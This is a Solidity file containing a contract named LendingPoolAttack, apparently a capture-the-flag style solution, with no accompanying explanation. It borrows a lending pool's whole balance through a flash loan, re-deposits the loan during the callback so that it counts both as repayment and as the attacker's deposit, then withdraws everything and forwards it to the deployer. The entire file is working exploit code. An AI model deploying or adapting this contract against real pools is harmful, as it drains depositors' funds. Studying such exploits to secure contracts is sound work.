// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;


interface ILendingPool {

    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256) external;
}


contract LendingPoolAttack {
    address public owner;
    ILendingPool public pool;

    constructor(address _pool) {
        owner = msg.sender;
        pool = ILendingPool(_pool);
    }

    function callPool() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}